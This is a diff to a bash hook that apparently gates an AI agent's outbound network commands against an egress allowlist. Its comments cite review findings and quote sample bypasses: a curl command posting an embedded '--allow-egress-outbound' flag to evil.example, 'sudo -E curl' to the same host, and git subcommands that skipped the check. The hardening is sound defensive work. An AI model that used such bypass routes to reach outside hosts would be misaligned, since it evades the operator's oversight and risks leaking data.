@@ -87,8 +87,24 @@ fi
 # ---------- bypass detection ----------
 
 # Spec D-6: BOTH env + flag must be present.
+#
+# R2 refinement: the flag must appear as a SPACE-BRACKETED token in the
+# command (preceded by start-of-string or whitespace AND followed by
+# end-of-string or whitespace). This blocks the prompt-injection pattern
+# `curl -d '{"x":"--allow-egress-outbound"}' https://evil.example` from
+# triggering the bypass — the embedded form is bracketed by `"` not
+# whitespace, so the pattern doesn't match. `grep -w` was too loose
+# (treats `"` as a word boundary, which still matches the embedded form).
+#
+# Caveat: this catches the common bypass-via-JSON-body case but does NOT
+# distinguish a real shell token from a single-quoted string literal
+# like `curl '... --allow-egress-outbound ...'`. Full shell-token
+# parsing would require porting a shellword splitter into the hook,
+# which is out of scope for v0.5.x. The two-factor design assumes the
+# operator who exported `WALTER_EGRESS_ALLOW_OVERRIDE=1` is reviewing
+# the command they typed; that env var is the real gate.
 _has_bypass_flag() {
-  echo "$1" | grep -qF -- '--allow-egress-outbound'
+  echo "$1" | grep -qE -- '(^|[[:space:]])--allow-egress-outbound([[:space:]]|$)'
 }
 
 _two_factor_bypass_active() {
@@ -147,8 +163,24 @@ _first_positional() {
 
 # Extract DNS-host from a URL string `scheme://[user[:pass]@]host[:port][/...]`.
 # Returns empty on no match. Uses bash regex.
+#
+# IPv6 literals MUST be enclosed in brackets in a URL (RFC 3986):
+#   http://[::1]/path → host = [::1]
+#   http://[fd00::1]:8080/api → host = [fd00::1]
+# We extract the bracketed form FIRST, then fall through to the IPv4 /
+# DNS-name regex. R2 (W1) finding — previously the `[` character was
+# returned as the "host" for IPv6 URLs which then failed CLI validation
+# with a cryptic message. The brackets are kept as part of the extracted
+# host so the allowlist entry can be written verbatim (`[::1]`,
+# `[fd00::1]`) — `_egress_validate_host` permits brackets for this case.
 _host_from_url() {
   local url="$1"
+  # IPv6 literal first: scheme://[...]
+  if [[ "$url" =~ ^[a-zA-Z][a-zA-Z0-9+.-]*://([^/@[:space:]]+@)?(\[[0-9a-fA-F:]+\]) ]]; then
+    printf '%s\n' "${BASH_REMATCH[2]}"
+    return 0
+  fi
+  # IPv4 / DNS hostname.
   if [[ "$url" =~ ^[a-zA-Z][a-zA-Z0-9+.-]*://([^/@[:space:]]+@)?([^/:[:space:]]+) ]]; then
     printf '%s\n' "${BASH_REMATCH[2]}"
     return 0
@@ -221,14 +253,59 @@ _inspect_segment() {
   local -a tokens
   read -ra tokens <<< "$seg"
   local cli="${tokens[0]:-}"
-  # Strip a leading `sudo` so `sudo curl X` still detects `curl`.
-  if [[ "$cli" == "sudo" ]]; then
-    cli="${tokens[1]:-}"
-    tokens=("${tokens[@]:1}")
-  fi
+
+  # Strip leading command wrappers + their flags / value-pairs / VAR=val
+  # assignments so `sudo -E curl X`, `sudo -u nobody curl X`, `env FOO=bar
+  # curl X`, `/usr/bin/env curl X` etc. still resolve to `curl`.
+  #
+  # Wrappers handled:  sudo, env, nice, nohup, time, stdbuf, setsid,
+  #                    chrt, taskset, ionice
+  # Value-taking flags for these: sudo -u/-g/-h/-r/-t/-T/-D/-A, env -u/-C.
+  # We're conservative: strip 2-token (-X val) form when we recognize
+  # the flag; otherwise strip just the flag.
+  #
+  # R2 finding (B1): without this, `sudo -E curl https://evil.example`
+  # silently passed because `-E` wasn't a known CLI → fell to `*) allow`.
+  local _strip_more=1
+  while [[ "$_strip_more" -eq 1 ]]; do
+    _strip_more=0
+    case "${cli##*/}" in
+      sudo|env|nice|nohup|time|stdbuf|setsid|chrt|taskset|ionice)
+        # Drop the wrapper itself.
+        tokens=("${tokens[@]:1}")
+        # Eat any flags, optional flag values, and VAR=val assignments.
+        while [[ ${#tokens[@]} -gt 0 ]]; do
+          case "${tokens[0]}" in
+            # Value-taking flags (sudo + env): consume the next token too.
+            -u|-g|-h|-r|-t|-T|-D|-A|-C|-N|-S)
+              tokens=("${tokens[@]:2}") ;;
+            # Any other short or long flag: just drop the flag.
+            -*)
+              tokens=("${tokens[@]:1}") ;;
+            # VAR=value (env-style assignment).
+            *=*)
+              tokens=("${tokens[@]:1}") ;;
+            *)
+              break ;;
+          esac
+        done
+        cli="${tokens[0]:-}"
+        _strip_more=1
+        ;;
+    esac
+  done
 
   # Strip absolute paths: /usr/bin/curl → curl.
   cli="${cli##*/}"
+
+  # After unwrapping, if the resulting CLI looks suspicious (empty, a
+  # leftover flag, or still a VAR=val) we cannot make a safe decision.
+  # Fail-CLOSED rather than fall through to the catch-all `*) allow`
+  # branch (R2 finding).
+  if [[ -z "$cli" || "${cli:0:1}" == "-" || "$cli" == *=* ]]; then
+    echo "BLOCK: network-gate: unable to identify the network CLI after stripping wrappers (sudo/env/...). Failing closed. Original segment: ${seg}"
+    return 0
+  fi
 
   case "$cli" in
     curl|wget)
@@ -262,10 +339,24 @@ _inspect_segment() {
       return 0
       ;;
     git)
-      # Only inspect subcommands that touch the network.
+      # Inspect subcommands that touch the network.
+      #
+      # R2 fixes:
+      #   - REMOVED `cherry` (B4) — `git cherry` is local-only (compares
+      #     local commits against upstream by reading local refs).
+      #   - ADDED `lfs|svn|annex|p4|bundle|send-email` (B5) — these git
+      #     extensions DO touch the network and were previously falling
+      #     through to the catch-all `*) allow` branch, fully bypassing
+      #     the gate.
+      #   - `remote` is kept LOCAL-by-default; `git remote -v` and
+      #     `git remote add` don't hit the network. The network-touching
+      #     `remote update` / `remote show` / `remote prune` subcommands
+      #     are rare in agent workflows. If an operator hits one of those
+      #     and needs the gate to cover it, they can run with the
+      #     two-factor bypass. (Out-of-scope refinement for v0.5.x.)
       local sub="${tokens[1]:-}"
       case "$sub" in
-        clone|fetch|pull|push|ls-remote|archive|remote|submodule|cherry|fetch-pack|send-pack)
+        clone|fetch|pull|push|ls-remote|submodule|fetch-pack|send-pack|http-fetch|http-push|imap-send|upload-pack|upload-archive|receive-pack|bundle|send-email|lfs|svn|annex|p4|cvsimport|cvsexportcommit)
           local t host found=0
           for t in "${tokens[@]:2}"; do
             if host="$(_host_from_url "$t")" && [[ -n "$host" ]]; then
@@ -282,15 +373,46 @@ _inspect_segment() {
           done
           if [[ "$found" -eq 0 ]]; then
             # `git fetch` with no explicit remote uses the configured
-            # upstream — implicit host. Fail-CLOSED per spec.
+            # upstream — implicit host. Fail-CLOSED per spec. Same for
+            # `git lfs push` etc. without an explicit remote.
             echo "BLOCK: network-gate: 'git $sub' uses an implicit remote (no URL on the command line). Pass the remote URL explicitly OR allowlist the configured remote's host with WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound."
             return 0
           fi
           echo "ALLOW"
           return 0
           ;;
+        archive)
+          # `git archive` is local by default but `--remote=URL` makes it
+          # network. If --remote is present, require URL extraction;
+          # otherwise pass through.
+          local t found_remote=0
+          for t in "${tokens[@]:2}"; do
+            case "$t" in --remote=*|--remote) found_remote=1; break ;; esac
+          done
+          if [[ "$found_remote" -eq 1 ]]; then
+            local found=0 host
+            for t in "${tokens[@]:2}"; do
+              # --remote=URL form
+              if [[ "$t" == --remote=* ]]; then
+                if host="$(_host_from_url "${t#--remote=}")" && [[ -n "$host" ]]; then
+                  found=1
+                  walter_egress_host_allowed "$host" || {
+                    echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via 'git archive --remote=')."; return 0;
+                  }
+                fi
+              fi
+            done
+            if [[ "$found" -eq 0 ]]; then
+              echo "BLOCK: network-gate: 'git archive --remote=' present but URL host could not be extracted. Failing closed."
+              return 0
+            fi
+          fi
+          echo "ALLOW"
+          return 0
+          ;;
         *)
-          # Local-only git operation (status, log, diff, add, commit, ...).
+          # Local-only git operation (status, log, diff, add, commit,
+          # cherry, branch, tag, stash, reset, rebase, …).
           echo "ALLOW"
           return 0
           ;;
